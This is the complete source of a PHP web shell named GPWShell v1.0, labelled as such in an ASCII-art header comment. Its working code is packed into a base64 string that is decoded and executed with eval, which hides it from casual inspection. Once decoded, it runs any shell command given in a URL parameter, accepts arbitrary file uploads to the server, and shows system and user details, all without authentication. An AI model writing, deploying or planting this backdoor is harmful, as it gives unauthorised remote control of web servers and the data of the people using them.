<!--                   
               _____ _       _ _ 
 ___ ___ _ _ _|   __| |_ ___| | |
| . | . | | | |__   |   | -_| | |
|_  |  _|_____|_____|_|_|___|_|_|
|___|_| Simple GUI PHP Web Shell  

GPWShell v1.0
Author: Carlos Padilla (cpadlab)
Proyect: https://github.com/cpadlab/GPWShell
-->
<?php

    $webshell = base64_decode("PD9waHAKCiAgICAkdGl0bGUgPSAnR1BXU2hlbGwnOwogICAgJHZlcnNpb24gPSAndjEuMCc7CiAgICAkYXV0aCA9ICdjcGFkbGFiJzsKCiAgICBmdW5jdGlvbiBleGVjQ29tbWFuZCgkY29tbWFuZCkge3JldHVybiBzaGVsbF9leGVjKCRjb21tYW5kKTt9CgogICAgZnVuY3Rpb24gZ2V0RmlsZVBhdGgoKSB7cmV0dXJuIF9fRklMRV9fO30KICAgIGZ1bmN0aW9uIGdldFBIUHZlcnNpb24oKSB7cmV0dXJuIHBocHZlcnNpb24oKTt9CiAgICBmdW5jdGlvbiBnZXRQb3J0KCkge3JldHVybiBpc3NldCgkX1NFUlZFUlsnU0VSVkVSX1BPUlQnXSkgPyAkX1NFUlZFUlsnU0VSVkVSX1BPUlQnXSA6ICdVbmtvd25Qb3J0Jzt9CiAgICBmdW5jdGlvbiBnZXRIb3N0KCkge3JldHVybiBpc3NldCgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pID8gJF9TRVJWRVJbJ0hUVFBfSE9TVCddIDogJ1Vua293bkhvc3QnO30KICAgIGZ1bmN0aW9uIGdldFVSTFZhcigkdmFyKSB7cmV0dXJuIGlzc2V0KCRfR0VUWyR2YXJdKSA/ICRfR0VUWyR2YXJdIDogbnVsbDt9CiAgICBmdW5jdGlvbiBnZXRVUkxWYXJzKCkge3JldHVybiBodHRwX2J1aWxkX3F1ZXJ5KCRfR0VUKTt9CiAgICBmdW5jdGlvbiBnZXRTZXJ2U29mdHdhcmUoKSB7CiAgICAgICAgaWYgKGlzc2V0KCRfU0VSVkVSWydTRVJWRVJfU09GVFdBUkUnXSkpIHtyZXR1cm4gJF9TRVJWRVJbJ1NFUlZFUl9TT0ZUV0FSRSddOwogICAgICAgIH0gZWxzZSB7cmV0dXJuICdVbmtvd25TZXJ2U29mdHdhcmUnO319CgogICAgZnVuY3Rpb24gcmVsb2FkU2hlbGwoKSB7aGVhZGVyKCJMb2NhdGlvbjogeyRfU0VSVkVSWydQSFBfU0VMRiddfSIpO2V4aXQoKTt9CgogICAgZnVuY3Rpb24gdXBkYXRlVVJMVmFyKCR2YXJzKSB7cmV0dXJuICRfU0VSVkVSWydQSFBfU0VMRiddIC4gJz8nIC4gaHR0cF9idWlsZF9xdWVyeShhcnJheV9tZXJnZSgkX0dFVCwgJHZhcnMpKTt9CgogICAgJF9zb2Z0d2FyZSA9IGdldFNlcnZTb2Z0d2FyZSgpOwogICAgJF9ob3N0ID0gZ2V0SG9zdCgpIC4gIjoiIC4gZ2V0UG9ydCgpOwogICAgJHVybF92YXJzID0gIiYiIC4gZ2V0VVJMVmFycygpOwogICAgJF91bmFtZV9hID0gZXhlY0NvbW1hbmQoInVuYW1lIC1hIik7CiAgICAkX3VzZXJuYW1lX2lkID0gZXhlY0NvbW1hbmQoImlkIik7CiAgICAkX2xvY2F0ZWQgPSBnZXRGaWxlUGF0aCgpOwoKICAgIGlmIChnZXRVUkxWYXIoImFjdGlvbiIpID09ICJjb21tYW5kIiAmJiBnZXRVUkxWYXIoImNvbW1hbmQiKSkgewogICAgICAgICRfY29tbWFuZF9vdXRwdXQgPSBleGVjQ29tbWFuZChnZXRVUkxWYXIoImNvbW1hbmQiKSk7CiAgICB9CgogICAgaWYgKCRfU0VSVkVSWyJSRVFVRVNUX01FVEhPRCJdID09ICJQT1NUIiAmJiBpc3NldCgkX1BPU1RbImFjdGlvbiJdKSAmJiAkX1BPU1RbImFjdGlvbiJdID09ICJzdWJtaXQiKSB7CgogICAgICAgIGlmIChpc3NldCgkX0ZJTEVTWyJmaWxlIl0pICYmICRfRklMRVNbImZpbGUiXVsiZXJyb3IiXSA9PSBVUExPQURfRVJSX09LKSB7CiAgICAgICAgICAgIG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJmaWxlIl1bInRtcF9uYW1lIl0sICIuLyIgLiAkX0ZJTEVTWyJmaWxlIl1bIm5hbWUiXSk7CiAgICAgICAgICAgIGVjaG8gIjxzY3JpcHQ+YWxlcnQoJ1tJbmZvXSBUaGUgZmlsZSBoYXMgYmVlbiB1cGxvYWRlZCBzdWNjZXNzZnVsbHkuJyk7PC9zY3JpcHQ+IjsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBlY2hvICI8c2NyaXB0PmFsZXJ0KCdbRXJyXSBUaGVyZSB3YXMgYW4gZXJyb3IgdXBsb2FkaW5nIHRoZSBmaWxlLicpOzwvc2NyaXB0PiI7CiAgICAgICAgfQogICAgfQoKPz4KCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CjxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgogICAgCiAgICA8dGl0bGU+PD9waHAgZWNobyAkdGl0bGU/PjwvdGl0bGU+CgogICAgPHN0eWxlPgogICAgICAgIDpyb290IHsKICAgICAgICAgICAgLS1jb2xvcjojZTNlM2UzOwogICAgICAgICAgICAtLWJnOiAjMWMxYzFjO30KICAgICAgICAqIHsKICAgICAgICAgICAgbWFyZ2luOiAwOwogICAgICAgICAgICBwYWRkaW5nOiAwOwogICAgICAgICAgICBib3gtc2l6aW5nOiBib3JkZXItYm94O30KICAgICAgICBib2R5IHsKICAgICAgICAgICAgYmFja2dyb3VuZDogdmFyKC0tYmcpOwogICAgICAgICAgICBjb2xvcjogdmFyKC0tY29sb3IpOwogICAgICAgICAgICBmb250LWZhbWlseTogVmVyZGFuYSwgc2Fucy1zZXJpZjt9CiAgICAgICAgaHIgewogICAgICAgICAgICBtYXJnaW46IDFlbTsKICAgICAgICAgICAgbWFyZ2luLWxlZnQ6IDJlbTsKICAgICAgICAgICAgbWFyZ2luLXJpZ2h0OiAyZW07CiAgICAgICAgICAgIGhlaWdodDogMXB4OwogICAgICAgICAgICBvcGFjaXR5OiAuNDt9CiAgICAgICAgc2VjdGlvbnsKICAgICAgICAgICAgcGFkZGluZzogMWVtOwogICAgICAgICAgICBwYWRkaW5nLWxlZnQ6IDJlbTsKICAgICAgICAgICAgcGFkZGluZy1yaWdodDogMmVtO30KCiAgICAgICAgLyogLS0tIEhFQURFUiAtLS0gKi8KCiAgICAgICAgaGVhZGVyIHsKICAgICAgICAgICAgZGlzcGxheTogZmxleDsKICAgICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgICAgICAgICAganVzdGlmeS1jb250ZW50OiBzcGFjZS1iZXR3ZWVuOwogICAgICAgICAgICBwYWRkaW5nOiAxZW07CiAgICAgICAgICAgIHBhZGRpbmctbGVmdDogMmVtOwogICAgICAgICAgICBwYWRkaW5nLXJpZ2h0OiAyZW07CiAgICAgICAgICAgIHBhZGRpbmctYm90dG9tOiAwO30KICAgICAgICBoZWFkZXIgYSBzdmcgewogICAgICAgICAgICB3aWR0aDogMWVtOwogICAgICAgICAgICBoZWlnaHQ6IDFlbTt9CiAgICAgICAgaGVhZGVyIG5hdiBoMTo6YWZ0ZXIgewogICAgICAgICAgICBmb250LXdlaWdodDogbm9ybWFsOwogICAgICAgICAgICBjb250ZW50OiAnIGJ5IDw/cGhwIGVjaG8gJGF1dGg/Pic7fQogICAgICAgIGhlYWRlciBuYXYgYSB7CiAgICAgICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgICAgICAgICAgcGFkZGluZy1sZWZ0OiAxZW07fQogICAgICAgIGhlYWRlciBuYXYgYTpmaXJzdC1jaGlsZCB7cGFkZGluZy1sZWZ0OiB1bnNldDt9CgogICAgICAgIC8qIC0tLSBTZWN0aW9uOiBJTkZPIC0tLSAqLwoKICAgICAgICAubWktaXRlbSB7bWFyZ2luLXRvcDogLjVlbTt9CiAgICAgICAgLm1pLWl0ZW06Zmlyc3QtY2hpbGQge21hcmdpbi10b3A6IHVuc2V0O30KICAgICAgICAubWktbGFiZWwge2ZvbnQtd2VpZ2h0OiBib2xkO30KCiAgICAgICAgLyogLS0tIFNlY3Rpb246IENPTU1BTkRTIC0tLSAqLwoKICAgICAgICAubWFpbl9jb21tYW5kcyAjZm9ybV9leGVjX2NvbW1hbmQgaW5wdXRbdHlwZT0idGV4dCJdOmZvY3VzIHtvdXRsaW5lOiBub25lO30KICAgICAgICAubWFpbl9jb21tYW5kcyB0ZXh0YXJlYSB7CiAgICAgICAgICAgIG1hcmdpbi10b3A6IDFlbTsKICAgICAgICAgICAgcmVzaXplOiBub25lO30KCiAgICAgICAgLyogLS0tIFNlY3Rpb246IFNVQk1JVCAtLS0gKi8KCiAgICAgICAgI2Zvcm1fc3VibWl0X2ZpbGUgaW5wdXRbdHlwZT0iZmlsZSJdIHsKICAgICAgICAgICAgcGFkZGluZzogLjVlbSAxZW07CiAgICAgICAgICAgIGJhY2tncm91bmQ6IG5vbmU7CiAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHZhcigtLWNvbG9yKTsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNXB4OwogICAgICAgICAgICBjb2xvcjogdmFyKC0tY29sb3IpO30KCiAgICAgICAgLyogLS0tIENPTU1PTiBTZWN0aW9uIC0tLSAqLwoKICAgICAgICAubWFpbl9jb21tYW5kcyB0ZXh0YXJlYSwKICAgICAgICAuZmlsZV91cGxvYWQgI2Zvcm1fc3VibWl0X2ZpbGUgaW5wdXRbdHlwZT0ic3VibWl0Il0sCiAgICAgICAgLm1haW5fY29tbWFuZHMgI2Zvcm1fZXhlY19jb21tYW5kIGlucHV0IHsKICAgICAgICAgICAgcGFkZGluZzogLjVlbSAxZW07CiAgICAgICAgICAgIGJhY2tncm91bmQ6IG5vbmU7CiAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHZhcigtLWNvbG9yKTsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNXB4OwogICAgICAgICAgICBjb2xvcjogdmFyKC0tY29sb3IpO30KCiAgICAgICAgI2Zvcm1fc3VibWl0X2ZpbGUgaW5wdXRbdHlwZT0iZmlsZSJdLAogICAgICAgICNmb3JtX2V4ZWNfY29tbWFuZCBpbnB1dFt0eXBlPSJ0ZXh0Il0ge2ZsZXg6IDE7fQoKICAgICAgICAjZm9ybV9zdWJtaXRfZmlsZSwgCiAgICAgICAgI2Zvcm1fZXhlY19jb21tYW5kIHsKICAgICAgICAgICAgZGlzcGxheTogZmxleDsKICAgICAgICAgICAgZmxleC1kaXJlY3Rpb246IHJvdzsKICAgICAgICAgICAgYWxpZ24taXRlbXM6IHN0cmV0Y2g7fQoKICAgICAgICAuZmlsZV91cGxvYWQsIAogICAgICAgIC5tYWluX2NvbW1hbmRzIHsKICAgICAgICAgICAgZGlzcGxheTogZmxleDsKICAgICAgICAgICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsKICAgICAgICAgICAgYWxpZ24taXRlbXM6IHN0cmV0Y2g7fQoKICAgICAgICAuZmlsZV91cGxvYWQgI2Zvcm1fc3VibWl0X2ZpbGUgaW5wdXRbdHlwZT0ic3VibWl0Il0sIAogICAgICAgIC5tYWluX2NvbW1hbmRzICNmb3JtX2V4ZWNfY29tbWFuZCBpbnB1dFt0eXBlPSJzdWJtaXQiXSB7CiAgICAgICAgICAgIGN1cnNvcjogcG9pbnRlcjsKICAgICAgICAgICAgbWFyZ2luLWxlZnQ6IDFlbTt9CiAgICA8L3N0eWxlPgoKPC9oZWFkPgo8Ym9keT4KICAgIAoKICAgIDxoZWFkZXI+CgogICAgICAgIDxuYXY+CiAgICAgICAgICAgIDxoMT48P3BocCBlY2hvICR0aXRsZT8+IDw/cGhwIGVjaG8gJHZlcnNpb24/PjwvaDE+CiAgICAgICAgPC9uYXY+CgogICAgICAgIDxuYXY+CiAgICAgICAgICAgIDxhIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS9jcGFkbGFiL0dQV1NoZWxsIiB0YXJnZXQ9Il9ibGFuayI+CiAgICAgICAgICAgICAgICA8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiPgogICAgICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik0xMiAwYy02LjYyNiAwLTEyIDUuMzczLTEyIDEyIDAgNS4zMDIgMy40MzggOS44IDguMjA3IDExLjM4Ny41OTkuMTExLjc5My0uMjYxLjc5My0uNTc3di0yLjIzNGMtMy4zMzguNzI2LTQuMDMzLTEuNDE2LTQuMDMzLTEuNDE2LS41NDYtMS4zODctMS4zMzMtMS43NTYtMS4zMzMtMS43NTYtMS4wODktLjc0NS4wODMtLjcyOS4wODMtLjcyOSAxLjIwNS4wODQgMS44MzkgMS4yMzcgMS44MzkgMS4yMzcgMS4wNyAxLjgzNCAyLjgwNyAxLjMwNCAzLjQ5Mi45OTcuMTA3LS43NzUuNDE4LTEuMzA1Ljc2Mi0xLjYwNC0yLjY2NS0uMzA1LTUuNDY3LTEuMzM0LTUuNDY3LTUuOTMxIDAtMS4zMTEuNDY5LTIuMzgxIDEuMjM2LTMuMjIxLS4xMjQtLjMwMy0uNTM1LTEuNTI0LjExNy0zLjE3NiAwIDAgMS4wMDgtLjMyMiAzLjMwMSAxLjIzLjk1Ny0uMjY2IDEuOTgzLS4zOTkgMy4wMDMtLjQwNCAxLjAyLjAwNSAyLjA0Ny4xMzggMy4wMDYuNDA0IDIuMjkxLTEuNTUyIDMuMjk3LTEuMjMgMy4yOTctMS4yMy42NTMgMS42NTMuMjQyIDIuODc0LjExOCAzLjE3Ni43Ny44NCAxLjIzNSAxLjkxMSAxLjIzNSAzLjIyMSAwIDQuNjA5LTIuODA3IDUuNjI0LTUuNDc5IDUuOTIxLjQzLjM3Mi44MjMgMS4xMDIuODIzIDIuMjIydjMuMjkzYzAgLjMxOS4xOTIuNjk0LjgwMS41NzYgNC43NjUtMS41ODkgOC4xOTktNi4wODYgOC4xOTktMTEuMzg2IDAtNi42MjctNS4zNzMtMTItMTItMTJ6IiBmaWxsPSIjZTNlM2UzIi8+CiAgICAgICAgICAgICAgICA8L3N2Zz4KICAgICAgICAgICAgPC9hPgogICAgICAgICAgICA8YSBocmVmPSIiPgogICAgICAgICAgICAgICAgPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MTIgNTEyIj4KICAgICAgICAgICAgICAgICAgICA8cGF0aCBkPSJNNDYzLjUgMjI0SDQ3MmMxMy4zIDAgMjQtMTAuNyAyNC0yNFY3MmMwLTkuNy01LjgtMTguNS0xNC44LTIyLjJzLTE5LjMtMS43LTI2LjIgNS4yTDQxMy40IDk2LjZjLTg3LjYtODYuNS0yMjguNy04Ni4yLTMxNS44IDFjLTg3LjUgODcuNS04Ny41IDIyOS4zIDAgMzE2LjhzMjI5LjMgODcuNSAzMTYuOCAwYzEyLjUtMTIuNSAxMi41LTMyLjggMC00NS4zcy0zMi44LTEyLjUtNDUuMyAwYy02Mi41IDYyLjUtMTYzLjggNjIuNS0yMjYuMyAwcy02Mi41LTE2My44IDAtMjI2LjNjNjIuMi02Mi4yIDE2Mi43LTYyLjUgMjI1LjMtMUwzMjcgMTgzYy02LjkgNi45LTguOSAxNy4yLTUuMiAyNi4yczEyLjUgMTQuOCAyMi4yIDE0LjhINDYzLjV6IiBmaWxsPSIjZTNlM2UzIi8+CiAgICAgICAgICAgICAgICA8L3N2Zz4gCiAgICAgICAgICAgIDwvYT4KICAgICAgICA8L25hdj4KCiAgICA8L2hlYWRlcj4gCgogICAgPGhyPgoKICAgIDxtYWluPgoKICAgICAgICA8c2VjdGlvbiBjbGFzcz0ibWFpbi1pbmZvIj4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1pLWl0ZW0gbWktaG9zdCI+CiAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3M9Im1pLWxhYmVsIj5Ib3N0OjwvbGFiZWw+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJfbWlzX2hvc3QiPjw/cGhwIGVjaG8gJF9ob3N0Pz48L2xhYmVsPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAKICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWktaXRlbSBtaS1zZXJ2Ij4KICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0ibWktbGFiZWwiPlNvZnR3YXJlOjwvbGFiZWw+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJfbWlzX1BIUF92ZXJzaW9uIj48P3BocCBlY2hvICRfc29mdHdhcmU/PjwvbGFiZWw+CiAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWktaXRlbSBtaS11bmFtZSI+CiAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3M9Im1pLWxhYmVsIj5VbmFtZSAtYTo8L2xhYmVsPgogICAgICAgICAgICAgICAgPGxhYmVsIGlkPSJfbWl1X3VuYW1lX2EiPjw/cGhwIGVjaG8gJF91bmFtZV9hPz48L2xhYmVsPgogICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1pLWl0ZW0gbWktdXNlcm5hbWUiPgogICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJtaS1sYWJlbCI+SWQ6PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxsYWJlbCBpZD0iX21pdV91c2VybmFtZSI+PD9waHAgZWNobyAkX3VzZXJuYW1lX2lkPz48L2xhYmVsPgogICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1pLWl0ZW0gbWktbG9jYXRlZCI+CiAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3M9Im1pLWxhYmVsIj5Mb2NhdGVkOjwvbGFiZWw+CiAgICAgICAgICAgICAgICA8bGFiZWwgaWQ9Il9taXVfbG9jYXRlZCI+PD9waHAgZWNobyAkX2xvY2F0ZWQ/PjwvbGFiZWw+CiAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICA8L3NlY3Rpb24+CgogICAgICAgIDxocj4KCiAgICAgICAgPHNlY3Rpb24gY2xhc3M9Im1haW5fY29tbWFuZHMiPgoKICAgICAgICAgICAgPGZvcm0gaWQ9ImZvcm1fZXhlY19jb21tYW5kIiBtZXRob2Q9ImdldCI+CgogICAgICAgICAgICAgICAgPGlucHV0IGhpZGRlbiB2YWx1ZT0iY29tbWFuZCIgbmFtZT0iYWN0aW9uIj4KCiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgcGxhY2Vob2xkZXI9IkNvbW1hbmQiIG5hbWU9ImNvbW1hbmQiPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkV4ZWMiPgoKICAgICAgICAgICAgPC9mb3JtPgoKICAgICAgICAgICAgPHRleHRhcmVhIGNvbHM9IjMwIiByb3dzPSI4IiByZWFkb25seT48P3BocCBlY2hvICRfY29tbWFuZF9vdXRwdXQ/PjwvdGV4dGFyZWE+CiAgICAKICAgICAgICA8L3NlY3Rpb24+CgogICAgICAgIDxocj4KCiAgICAgICAgPHNlY3Rpb24gY2xhc3M9ImZpbGVfdXBsb2FkIj4KCiAgICAgICAgICAgIDxmb3JtIGlkPSJmb3JtX3N1Ym1pdF9maWxlIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPgoKICAgICAgICAgICAgICAgIDxpbnB1dCBoaWRkZW4gdmFsdWU9InN1Ym1pdCIgbmFtZT0iYWN0aW9uIj4KCiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSI+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU3VibWl0Ij4KCiAgICAgICAgICAgIDwvZm9ybT4KCiAgICAgICAgPC9zZWN0aW9uPgoKCiAgICA8L21haW4+CiAgICAKPC9ib2R5Pgo8L2h0bWw+");

    eval("?>" . $webshell . "<?php ");
?>